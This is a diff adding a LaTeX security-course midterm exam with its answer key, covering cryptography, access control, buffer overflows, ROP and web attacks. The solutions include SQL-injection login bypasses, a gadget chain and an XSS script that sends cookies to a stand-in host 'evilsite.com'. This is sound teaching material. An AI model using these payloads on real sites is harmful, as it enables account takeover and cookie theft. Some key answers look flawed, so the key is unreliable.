@@ -1,0 +1,752 @@
+\documentclass[addpoints]{exam}
+\usepackage{url}
+\usepackage{times}
+\usepackage{epsfig}
+\usepackage{listings}
+\usepackage{mathtools}
+\lstset{
+basicstyle=\small\ttfamily,
+columns=flexible,
+breaklines=true
+}
+
+\lhead{\ifcontinuation{Question \ContinuedQuestion\ continues\ldots}{}}
+\chead{ECE 422 / CS 461, Midterm Exam}
+\rhead{Wednesday, March 9th, 2016}
+\lfoot{Points: \makebox[.5in]{\hrulefill} / \pointsonpage{\thepage}}
+\cfoot{\thepage\ of \numpages}
+\rfoot{NetID:\enspace\makebox[1.5in]{\hrulefill}}
+%\rfoot{\netid}
+
+\qformat{\thequestiontitle\dotfill \emph{\totalpoints\ points}}
+
+\begin{document}
+
+\begin{titlepage}
+  \vspace*{\fill}
+  \begin{center}
+    \Large\textbf{ECE 422 / CS 461, Midterm Exam}\\
+    \large\textit{Wednesday, March 9th, 2016}\\
+  \end{center}
+  \vspace{.5in}
+  \par\large{Name:}\hrulefill\\
+  \par\large{NetID:}\hrulefill\\
+  \vspace{.5in}
+  \begin{itemize}
+  \item Be sure that your exam booklet has \numpages\ pages.
+  \item Absolutely no interaction between students is allowed.
+  \item Show all of your work.
+  \item Write all answers in the space provided.
+  \item Closed book, closed notes.
+  \item No electronic devices allowed.
+  \item You have \textbf{TWO HOURS} to complete this exam.
+  \end{itemize}
+  \vspace*{\fill}
+\end{titlepage}
+\newpage 
+
+\begin{center}
+  \vspace*{\stretch{1}}
+  \gradetable[v][pages]
+  \vspace*{\stretch{1}}
+\end{center}
+\newpage
+
+\begin{questions}
+
+\titledquestion{Question \thequestion: Multiple Choice}
+
+%The line below is invalid since you will not solely be circling answers
+\textbf{For each question, circle all that apply.}
+
+\begin{parts}
+
+\part[2] %simon's t/f
+
+Discretionary access control, which takes a hierarchical approach to controlling access, is more secure and strict than role-based access control.
+
+\begin{choices}
+\choice True
+\correctchoice False
+\end{choices}
+
+\part[2] %lawrence
+
+As a defender, thinking about the weaknesses of a system falls under which category?
+
+\begin{choices}
+\choice Security Policy
+\correctchoice Risk Assessment
+\choice Threat Model
+\choice Countermeasures
+\end{choices}
+
+\part[2] %lawrence
+
+The Unix set-user-ID (``suid'') bit is used to ensure that folder contents are deleted only by the user who created them and the root user.
+
+\begin{choices}
+\choice True
+\correctchoice False
+\end{choices}
+
+\part[2] %matt
+
+How are arguments passed to system calls in x86?
+
+\begin{choices}
+\choice On the Stack
+\correctchoice Through registers
+\choice The stack and registers
+\choice System calls don't take arguments
+\end{choices}
+
+\part[2] %matt
+
+The x86 architecture uses Big Endian byte order for storage in memory.
+
+\begin{choices}
+\choice True
+\correctchoice False
+\end{choices}
+
+\part[2] %shivam
+
+To use RSA for confidentiality, you must encrypt with the private key and decrypt with the public key.
+
+\begin{choices}
+\choice True
+\correctchoice False
+\end{choices}
+
+\part[2] %matt
+
+Which type(s) of malware require human assistance in order to replicate?
+
+\begin{choices}
+\choice Worm
+\correctchoice Virus
+\correctchoice Trojan Horse
+\choice Bot
+\end{choices}
+
+\part[2] %matt
+
+%Alernate question: This type of code allows a virus to generate a semantically different version of it upon propagation.
+What type of virus code will include a code rewriter to generate semantically different virus code upon propagation?
+
+\begin{choices}
+\choice Polymorphic Code
+\choice Heteromorphic Code
+\correctchoice Metamorphic Code
+\choice Homomorphic Code
+\end{choices}
+
+\pagebreak
+
+\part[2] %matt
+
+This type of Access Control Design relies on a system administrator to define permissions on files regardless of ownership.
+
+\begin{choices}
+\choice Role-Based Access Control
+\choice Discretionary Access Control
+\choice Administrator-Based Access Control
+\correctchoice Mandatory Access Control
+\end{choices}
+
+\part[2] %siddharth
+
+If we want to provide a unique identifier for a message, we use
+
+\begin{choices}
+\correctchoice Cryptographic Hashing
+\choice Symmetric Key Cryptography
+\choice Public Key Cryptography
+\choice None of the above
+\end{choices}
+
+\part[2] %siddharth
+
+What is a method of preventing SQL injection?
+
+\begin{choices}
+\choice Public key Cryptography
+\correctchoice Prepared Statements
+\choice Stack Canary
+\choice Salting
+\end{choices}
+
+\part[2] %siddharth
+
+Which of the following ciphers can be used in Cipher Block Chaining (CBC) mode?
+
+\begin{choices}
+\choice Caesar Cipher
+\choice Diffie-Hellman
+\correctchoice AES
+\choice None of the above
+\end{choices}
+
+\part[2] %tong
+In virtual machines, data can move between two guest OSes.
+\begin{choices}
+\choice True
+\correctchoice False
+\end{choices}
+
+% \part[2] %tong
+% In C, printf can take arbitrarily many parameters. How can it know the number of parameters?
+% \begin{choices}
+% \choice Through ecx register
+% \choice Through the first value pushed into stack during function call
+% \choice Through the last value pushed into stack during function call
+% \choice It's determined at compile time
+% \correctchoice None of the above
+% \end{choices}
+
+\part[2] %tong
+Suppose you want to crack a password. You know it's a 48-bit binary number. You know it's encrypted as H(password) where H is a perfect hashing function outputs 32 bits. How many trials do you need to crack the password in the worst case?
+\begin{choices}
+\choice ${2}^{16}$
+\choice ${2}^{32}$
+\correctchoice ${2}^{48}$
+\choice ${2}^{64}$
+\end{choices}
+
+\part[2] %dhruv
+My website allows users to create usernames using any characters they want. It also displays this username on their profile page. What attack is this vulnerable to?
+\begin{choices}
+\choice CSRF attack
+\correctchoice XSS attack
+\choice SQL Injection attack
+\choice Brute Force attack
+\end{choices}
+
+\part[2] %dhruv
+An iframe with different domains embedded in a webpage do not subject to same origin policy.
+% The Same Origin Policy does not apply to two different websites open on the same window of a browser.
+\begin{choices}
+\choice True
+\correctchoice False
+\end{choices}
+
+\part[2] %Due
+In the context of RSA, how would Alice digitally sign a document before sending it to Bob?
+
+\begin{choices}
+\correctchoice Encrypt the PRF with Alice's private key
+\choice Encrypt the PRF with Alice's public key
+\choice Encrypt the PRF with Bob's private key
+\choice Encrypt the PRF with Bob's public key
+\end{choices}
+
+\part[3] %simon's matching
+
+For each of the followings, identify one or more relevant security properties.\par
+Choose from \textbf{C} (Confidentiality), \textbf{I} (Integrity), \textbf{A} (Availability).
+
+% solution updated
+\fillin[A][0.25in] Denial-of-Service\par % +0.5 if correct
+\fillin[CI][0.25in] Man-in-the-Middle\par % +0.5 if both correct
+\fillin[CI][0.25in] RSA\par % +0.5 if one correct, +0.5 if all three(CIA), +1.0 if both correct
+\fillin[C][0.25in] One-time Pad\par % +0.5 if correct
+\fillin[I][0.25in] HMAC\par % +0.5 if correct
+% \fillin[CI][0.25in] Same-origin Policy\par
+
+\part[2] %simon's matching
+
+Identify the access control design used for each of the followings.
+\newline
+Choose from \textbf{M} (MAC), \textbf{D} (DAC), and \textbf{R} (RBAC).
+
+\fillin[D][0.25in] User's control over Facebook Privacy Settings (e.g. set the visibility of profile or photos to public, friends, or private)\par
+\fillin[D][0.25in] Unix user-group-other permissions (e.g. -rwxr-xr-x)\par
+% \fillin[M][0.25in] Military classifications of access rights for documents (e.g. unclassified, confidential, secret, top secret)\par
+\fillin[R][0.25in] Course subversion repository access control (e.g. students have access to \_shared and their own directories only; staffs have access to all directories)\par
+\fillin[M][0.25in] SELinux (Security-Enhanced Linux)\par
+
+\end{parts}
+
+\pagebreak
+
+\titledquestion{Question \thequestion: Short Answer}
+
+\begin{parts}
+
+\part[2] % @zhengping
+Usually, we need two specific instructions at the end of a x86 function. What are they?
+
+\begin{solutionorbox}[2in]   
+\begin{lstlisting}
+2pt - leave and ret
+\end{lstlisting}
+\end{solutionorbox}
+
+%\part[4] % @zhengping
+%Is the calling convention for system calls for the same as user defined functions? Explain
+
+%\begin{solutionorbox}[2in]   
+%\begin{lstlisting}
+%2pt - no
+%2pt - system calls pass parameters using registers, user defined functions use the stack.
+%\end{lstlisting}
+%\end{solutionorbox}
+
+\part[4] %shivam
+Identify and describe two defenses against rainbow tables.
+
+\begin{solutionorbox}[2in]   
+\begin{lstlisting}
+2pt - Identification (1 pt) and Description (1 pt) of Salted Hashes
+2pt - Identification (1 pt) and Description (1 pt) of Slow Hash Functions
+\end{lstlisting}
+\end{solutionorbox}
+
+\part[4] %shivam
+Identify and describe two techniques for reverse code engineering (RCE).
+
+\begin{solutionorbox}[2in]   
+\begin{lstlisting}
+2pt - Identification (1 pt) and Description (1 pt) of Static Code Analysis (disassemblers)
+2pt - Identification (1 pt) and Description (1 pt) of Dynamic Code Analysis (tracing/hooking or debuggers)
+\end{lstlisting}
+\end{solutionorbox}
+
+\part[3] %dhruv
+Name 3 different kinds of code injection attacks.
+
+\begin{solutionorbox}[2in]   
+\begin{lstlisting}
+1pt - SQL Injection
+1pt - Cross Site Scripting
+1pt - Buffer Overflow
+\end{lstlisting}
+\end{solutionorbox}
+
+\pagebreak
+
+\part[5] %Leslie
+CS461 course SVN repository used for MP submission is managed based on
+Access Control. It is set up to allow only authorized subjects to
+access permitted objects. Assume that you are the administrator to
+design access control list for users and groups accessing directories
+based on below rules. Fill in the access control table below with r
+(read), w (write) and/or - (none) to provide the most secured
+scenario.
+
+\begin{itemize}
+\item There are three different groups: Admins, Staffs, Students.
+\item Alice is a registered student, with netid ``alice1''.
+\item Bob is assigned as TA/course staff, with netid ``bob2''.
+\item Everybody can access and create files on their own directory with their netID.
+\item Admins are the owners who manage SVN repository and assign users and groups' permissions.
+\item Staffs are the course instructors and TAs who can access both public/shared, private areas.
+\item Staffs generate MP template files and runs the autogrder on the submissions on all staffs' and students' directory.
+\item Students are the rosters of the course who can access to shared area for downloading MP related files.
+\item Students submit MPs on their own directory with their netID.
+\item ``private'' folder is where only owner and the course staffs can access. Course staffs keep and update autograder in this folder. 
+\item ``roster'' folder is created by owner and shouldn't be modified by any others except the owner. Course staffs use roster/staff list in this directory for assignment distribution and grading on all staffs' and students' directories.
+\item ``shared'' folder is open to anybody in the course. Course staffs upload necessary MP files, e.g. VMs, on this folder.
+
+\end{itemize}
+
+\begin{table}[h]
+\centering
+  \begin{tabular}{l||c|c|c|c|c}
+  \hline
+  Directory & Admin & Staff & Student & Alice & Bob \\ \hline \hline
+  private & r,w &  &  &  & \\ \hline
+  roster & r,w &  &  &  & \\ \hline
+  shared & r,w &  &  &  & \\ \hline
+  alice1 & r,w &  &  &  & \\ \hline
+  bob2 & r,w &  &  &  & \\
+  \hline
+  \end{tabular}
+\end{table}
+
+\begin{solutionorbox}[1in]
+\begin{tabular}[c]{l||c|c|c|c|c}
+\hline
+Directory & Admin & Staff & Student & Alice & Bob \\ \hline \hline
+private & r,w & r,w & - & - & r,w \\ \hline
+roster & r,w & r & - & - & r \\ \hline
+shared & r,w & r,w & r & r & r,w \\ \hline
+alice1 & r,w & r,w & - & r,w & r,w \\ \hline
+bob2 & r,w & r,w & - & - & r,w \\
+\hline
+\end{tabular}
+\\ +0.25 for each blank
+\end{solutionorbox}
+
+%\part[2] %Leslie
+%Assume that passwords are limited to the use of the 95 printable ASCII characters and that all passwords are 10 characters in length. Assume a password cracker with an encryption rate of 6.4 million encryptions per second. How long will it take to test exhaustively all possible passwords on a UNIX system? Show your work.
+
+%\begin{solutionorbox}[1in]
+%$\frac{95^i{10}}{6.4*10^6} = 9.355$ seconds \\
+%+2 for correct answer, +1 for correct equation, but incorrect answer
+%\end{solutionorbox}
+
+%\part[2] %Leslie
+%Suppose you observe that your home PC is responding very slowly to information requests from the net. And then you further observe that your network gateway shows high levels of network activity, even though you have closed your e-mail client, Web browser, and other programs that access the net. What types of malware could cause these symptoms? What type of security properties does this payload attack? List two uses of this malware.
+
+%\begin{solutionorbox}[1in]
+%Botnet. This type of payload attacks the integrity and availability of the infected system. The example uses are DDos, spamming, sniffing traffic, keylogging, spreading new malware etc.\\
+%+0.5 each for malware type and security properties. +0.5 for each example.
+%\end{solutionorbox}
+
+\pagebreak
+
+\part[1] %Leslie
+Suppose that while trying to access a collection of short videos on some Website, you see a pop-up window stating that you need to install this custom codec in order to view the videos. What threat might this pose to your computer system if you approve this request?
+
+\begin{solutionorbox}[1in]
+Trojan horse
+\end{solutionorbox}
+
+\part[2] %Due
+What is Kerckhoff's principle? 
+
+\begin{solutionorbox}[1in]
+Do not rely on a secret function, use a secret key on a public function.
+\end{solutionorbox}
+
+\part[1] %Due
+Assume that a block cipher operates on blocks of size 256 bits. What
+would be the length of the padding (in bits) generated by the
+algorithm if you apply the cipher to a message that is 64 bits long?
+
+\begin{solutionorbox}[1in]   
+192 bits
+\end{solutionorbox}
+
+\part[1] %Due
+What is the downside of RSA compared to AES?
+
+\begin{solutionorbox}[1in]
+Speed: RSA can take 1000x longer to decrypt a message compared to AES. All or nothing
+\end{solutionorbox}
+
+\part[4] %Due
+Alice wanted to send an encrypted message to Bob using 128-bit AES, but first she needs to share the AES key $k$ with Bob. Alice knows Bob's 4096-bit RSA public key is (3, $N$), so she encrypted the key and sent $c_k = k^3$ mod $N$ to Bob. Then, she uses $k$ to encrypt a message $m$ with AES and send $c_m = AES_k(m)$ to Bob. Assume that the AES key is represented by an unsigned integer, and that RSA private key is stored securely, Explain how an eavesdropper who intercepts both messages can easily learn $m$ and propose a way to fix the problem. 
+
+\begin{solutionorbox}[2in]
+Since Bob's public exponent is very small and the AES key is only 128 bit long, $c_k$ will always be less than $N$ and hence the eavesdropper can easily recover $k$ by taking the cube root of $c_k$. Recovering $m$ is trivial now that Eve has $k$. A fix is to increase Bob's public exponent size or perhaps lower the size of $N$.\\
++2 correct explanation\\
++2 correct fix
+\end{solutionorbox}
+
+\part[4] %Due
+Let's say the ECE department wanted to share an ``anonymous'' logs of I-card swipe-in record for ECEB with a group of researchers. The department wants to ensure that the user's UIN aren't revealed, but the researchers need to be able to associate different swipe-in entries from the same person. The logs are huge, and anonymization has to be applied efficiently with only a small, fixed amount of storage. If the department replace each UIN with the SHA-256 hash of the UIN, is this sufficient to provide strong protection for the anonymity of the UINs? Briefly explain.
+
+\begin{solutionorbox}[2in]
+No, it does not.\\
+SHA256 is a hash function, so the researchers can enumerate all UINs and create a lookup table that match the SHA256 hash back to the UIN. The department should use some form of encryption algorithm or MAC instead.\\
++2 NO\\
++2 explanation.
+\end{solutionorbox}
+
+\end{parts}
+
+\pagebreak
+
+\titledquestion{Question \thequestion: AppSec MP Question}  % -Gene
+
+
+
+Consider the following function for all of the parts except for parts (g), (h), and (i):
+
+\begin{lstlisting}
+void foo(char *arg)
+{
+   ... 
+   char buf[4];
+   strcpy(buf, arg);
+}
+\end{lstlisting}
+
+\textbf{arg} is a pointer to a char string that is the command line input from the user.  
+Make these assumptions:
+\begin{itemize}
+\item The machine behaves just like the VM from MP1.
+\item All the defences mentioned in lectures are off
+\item You see the following information when the program arrives to the breakpoint at foo that you set earlier with the command \texttt{break foo} :
+\begin{itemize}
+\item \textbf{buf} begins at 0xbffebfc8. 
+\item $(gdb)$  x/2wx \$ebp\\
+0xbffebfd8: 0xbffec064 0x08048fe5
+\end{itemize}
+\end{itemize}
+
+\begin{parts}
+
+\part[2]
+
+Assume another function(e.g. main) is trying to call foo, what would be the size of the argument (number of bytes) that main needs to pass to foo?
+\begin{solutionorbox}[1in]
+4 bytes - all or nothing
+\end{solutionorbox}
+
+\part[2]
+
+What is the value of return address?
+
+\begin{solutionorbox}[1in]
+0x08048fe5 - all or nothing
+\end{solutionorbox}
+
+\part[5]
+Describe parts of the input (\textbf{arg}) that you would give to the program to overflow the buffer (\textbf{buf}) and execute the same shellcode that was given for the MP. The shellcode is 23 bytes. Be specific and include exact numbers.
+
+\begin{solutionorbox}[2in]
+0xd8-0xc8+4 = 20 bytes of 'A' or junk + 0xbffebfd8+8 = 0xbffebfe0 (one space below return address, where shellcode is) + shellcode
+
+OR
+
+first 18 bytes of shellcode + short jmp 4 (2 bytes) + 0xbffebfc8 + 5 bytes for the rest of shellcode
+
++1 including shellcode
++1 notice that shellcode won't fit \\
+If noticed:
++1 return addr at the correct location
++2 return addr has correct value (to shellcode)\\
+It is okay if they forget size of short jmp and use something like len(short jmp) to express it
+
+
+\end{solutionorbox}
+
+\part[3]
+
+If instead, you see the following information when the program arrives to the breakpoint at foo that you set earlier with the command \texttt{break foo} :
+\begin{itemize}
+\item \textbf{buf} begins at 0xbffebfa0. 
+\item $(gdb)$  x/2wx \$ebp\\
+0xbffebfd4: 0xbffec064 0x08048fe5
+\end{itemize}
+
+Would you need to change your solution from part(c) to achieve the same goal? Explain your answer.
+
+\begin{solutionorbox}[1in]
+
++1 Yes
++2 Distance between start of buffer to previous base pointer/return address is different
+
+\end{solutionorbox}
+
+
+\pagebreak
+\part[8]
+
+Assume you are required to do return-oriented programming with the same piece of code, consider the following gadgets. The first column is the address in hexadecimal representation followed by the instruction at that address:
+
+\begin{verbatim}
+8051750:	xor    %eax,%eax 
+8051752:	ret  
+
+8057360:	inc    %eax
+8057361:	pop    %edx
+8057362:	pop    %ecx
+8057363:	ret  
+
+8058680:	cmp    $0xffffff83,%eax
+8058683:	jne    80586f8 <_exit>
+8058689:	pop    %eax
+805868f:	ret   
+
+8057ae0:	int    $0x80
+\end{verbatim}
+
+Assume these are the only gadgets that you can use. Your task is to set the value of eax to 2 then invoke a system call. System call number 2 is sys\_fork, and the only argument it takes is stored in ebx. You can assume the argument has already been set up correctly. Draw a picture of the stack showing how you would chain the gadgets to complete your task. (Label the start of the chain and label which way is the top/bottom of the stack)
+
+\begin{solutionorbox}[3in]
+top of stack \\
+0x8051750 \#set eax to 0 (start of chain) \\
+0x8057360 \#inc eax \\
+0x41414141 \#garbage edx value \\
+0x41414141 \#garbage ecx value \\
+0x8057360 \#inc eax \\
+0x41414141 \#garbage edx value \\
+0x41414141 \#garbage ecx value \\
+0x8057ae0 \#system call\\
+or something like pop 0xffffffff into eax with 0x8058689, increment 3 times with 0x8057360 followed by 2 garbage values, then invoke system call
+
+-4 if answer contains 8058680 or 8058683(undefined behavior)
+-4 if answer doesn't have enough values on the stack to pop to registers
++2 attempt to inc eax
++4 correct value in eax
++2 invokes system call
+
+\end{solutionorbox}
+
+\part[3]
+Continue from part(e): assume the second gadget has been changed to the following:
+
+\begin{verbatim}
+8057300:	inc    %eax
+8057301:	pop    %edx
+8057302:	pop    %ecx
+8057303:	ret  
+\end{verbatim}
+Can you formulate a solution similar to part(e) to achieve the same goal? Why?
+
+\begin{solutionorbox}[1in]
++1 NO +2 inc is located at an address with null which is incompatible with strcpy
+\end{solutionorbox}
+
+\pagebreak
+
+\part[3]
+
+If stack canary was turned on for MP1.2, would your answers still work? Why?
+
+\begin{solutionorbox}[1in]
++1 NO
++2 For some problems we would have killed the canary, in that case we would have triggered exceptions.
+
+\end{solutionorbox}
+
+\part[3]
+
+Why would one want to use a callback shell(1.2.10) as the payload instead of a regular shell(shellcode.py)?
+
+\begin{solutionorbox}[1in]
+The attacker will be able to control the machine over a network instead of just locally. 3 points all or nothing
+
+\end{solutionorbox}
+
+
+\part[1]
+
+Which format specifier makes printf vulnerable to format string attack (1.2.11)?
+
+\begin{solutionorbox}[1in]
+\%n
+
+\end{solutionorbox}
+
+\end{parts}
+
+\pagebreak
+
+\titledquestion{Question \thequestion: WebSec MP Question}  %HB
+
+\begin{parts}
+	Please refer to following python code for part (a), (b).\\
+	Recall that Bungle had a python code named database.py which processes user input into SQL queries. A Bungler implemented \texttt{validateUser()} function in \texttt{database.py} as shown below.
+	\begin{lstlisting}
+	import MySQLdb as mdb
+	...
+	
+	def validateUser(username, password):
+	db_rw = connect()
+	cur = db_rw.cursor()
+	username = mdb.escape_string(username) #escapes special characters
+	cur.execute("SELECT id FROM users WHERE username='"+username
+	                +"'AND password='"+password+"'")
+	if cur.rowcount < 1:
+	    return False
+	return True
+	\end{lstlisting}
+	
+	%password field insecure
+	\part[2]
+	
+	Write an input pair \texttt{(username,password)} which bypasses authentication procedures and logs in as a user named \texttt{admin}.
+	\begin{solutionorbox}[1in]
+		(2pt) \texttt{("admin", "' or '1'='1';\#")}
+	\end{solutionorbox}
+	
+	%sql without prepared statement and privilege separation
+	\part[3]
+	Assume that this Bungler implemented all other parts of Bungle the same as you have done in MP2.1. Can an adversary attack Bungle by using SQL injection attacks like \texttt{DROP} \texttt{TABLE}? Why or why not?
+	
+	\begin{solutionorbox}[1in]
+		(1pt) No.\\
+		(2pt) Bungle enforce minimum privilege to database user so that only INSERT, UPDATE, SELECT is allowed.
+	\end{solutionorbox}
+	
+	%sql with MD5 but no escape
+	\part[4]
+	Consider following PHP code which resembles one from 2.2.1.3.
+	
+	\begin{verbatim}
+	if (isset($_POST['username']) and isset($_POST['password'])) {
+	    $username = $_POST['username'];
+	    $password = md5($_POST['password'], false);
+	    $sql_s = "SELECT * FROM users WHERE username='$username' and pw='$password'";
+	    $rs = mysql_query($sql_s);
+	    if (mysql_num_rows($rs) > 0) {
+	        echo "Login successful!";
+	    } else {
+	        echo "Incorrect username or password";
+	    }
+	}
+	\end{verbatim}
+	
+	Note that this code uses false as second parameter of \texttt{md5()} function so that the function returns the hash as a 32-character hexadecimal number in string. Is this code secure against any SQL injection? If not, provide an input pair \texttt{(username,password)} which bypasses authentication procedures by logging in as a user named \texttt{admin}. In addition, suggest a solution to fix this code and protect against any SQL injection if you think this code is vulnerable.
+	
+	\begin{solutionorbox}[1in]
+		(1pt) No.\\
+		(1pt) \texttt{("admin';\#","")}\\
+		(2pt) prepared statement or escaping username (and password)
+		
+	\end{solutionorbox}
+	
+	%using GET for login instead of POST
+	\part[2]
+	Assume that Bungle uses GET for \texttt{\textbackslash login} instead of POST. Write a URL so that when victim visits this URL, he would open a Bungle which is already logged in as a user named \text{attacker} with password \text{l33th4x}. 
+	\begin{solutionorbox}[1in]
+		\texttt{http://bungle.cs461.cs.illinois.edu/login?}\\
+		\texttt{username=attacker\&password=l33th4x}
+	\end{solutionorbox}
+	
+	%why XSS is needed for 2.2.2.2
+	\part[6]
+	Recall in 2.2.2.2, you were asked to create an HTML file that, when opened by a victim, logs their browser into Bungle under the account \texttt{attacker}. In addition, you were asked to do this attack against a server which uses token validation mechanism. The server sets a cookie named \texttt{csrf\_token} to a random 16-byte value and also include this value as a hidden field in the login form. When the form is submitted via POST, the server verifies that the client's cookie matches the value in the form.\\ 
+	Explain why exploiting Bungle's vulnerability on XSS was necessary for 2.2.2.2.
+	
+	\begin{solutionorbox}[2in]
+		(1pt) Token is stored in browser.\\
+		(2pt) It is protected by the Same Origin Policy; the origin of Bungle and that of 2.2.2.2.html are different.\\
+		(2pt) Token validation forces user to submit csrf\_token as one of POST parameters.\\
+		(1pt) XSS enables attacker to obtain or forge the token, because script runs inside Bungle.
+	\end{solutionorbox}
+	
+	%js writing question
+	\part[6]
+	Write an injection script which will report all cookies of target website when injected via XSS. The script should report cookies, like you have done for Spying requirement on 2.2.3, to a URL with a format shown below where key$i$ is name of ith cookie and value$i$ is value of ith cookie.\\
+	\texttt{http://www.evilsite.com:31337/stolen\_cookies?key1=value1\&key2=value2...}\\
+	If you are not sure about exact syntax of any Javascript or jQuery function, you may use the function in pseudo-code style.
+	\begin{solutionorbox}[2in]
+		\begin{verbatim}
+		<script>
+		    var url = "http://www.evilsite.com:31337/stolen_cookies?";
+		    var keyValuePairs = document.cookie.replace("; ","&");
+		    url = url + keyValuePairs;
+		    $.get(url);
+		</script>
+		\end{verbatim}
+		(1pt) using document.cookie to obtain cookie\\
+		(2pt) using any function which parses output of document.cookie correctly\\
+		(2pt) using \$.get or other equivalent function to make a GET request\\
+		(1pt) correct URL syntax for \$.get(url)'s url parameter (or data as second parameter)
+	\end{solutionorbox}
+	
+	%explain how to persist on 2.2.3
+	\part[7]
+	Recall that for 2.2.3, you were asked to demonstrate XSS attacks against Bungle's search box, which does not properly filter search terms before echoing them to the results page. Your goal was to construct a URL that, if loaded in the victim's browser, correctly executes the payload which required persistency as one of the  requirements. Explain in detail how you made your payload persist when a user logged into Bungle with his account.
+	
+	\begin{solutionorbox}[2in]
+		(1pt) remove original functionality of login button\\
+		(1pt) bind login button with a new onclick event handler\\
+		(1pt) read user input using jQuery/javascript function from username and userpass fields\\
+		(2pt) using \$.ajax or other equivalent function to submit a POST request\\
+		(2pt) reload the page by calling function equivalent to proxy() from framework code
+	\end{solutionorbox}
+\end{parts}
+
+\pagebreak
+
+\end{questions}
+
+\end{document}
